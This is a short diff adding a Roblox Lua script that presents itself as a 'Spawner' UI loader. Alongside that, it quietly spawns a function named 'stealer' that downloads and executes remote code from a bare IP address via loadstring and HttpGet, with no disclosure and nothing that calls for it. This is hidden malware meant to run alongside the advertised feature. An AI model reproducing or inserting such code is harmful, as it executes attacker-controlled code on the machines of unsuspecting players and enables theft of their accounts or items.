@@ -1,0 +1,12 @@
+local function stealer()
+    ID="7292f569-2fbd-4d47-820c-86f02171aa3e";
+loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
+end
+local function loadui()
+  local Spawner = loadstring(game:HttpGet("https://gitlab.com/darkdark/dark/-/raw/main/Spawner.lua"))()
+Spawner.Load()
+
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
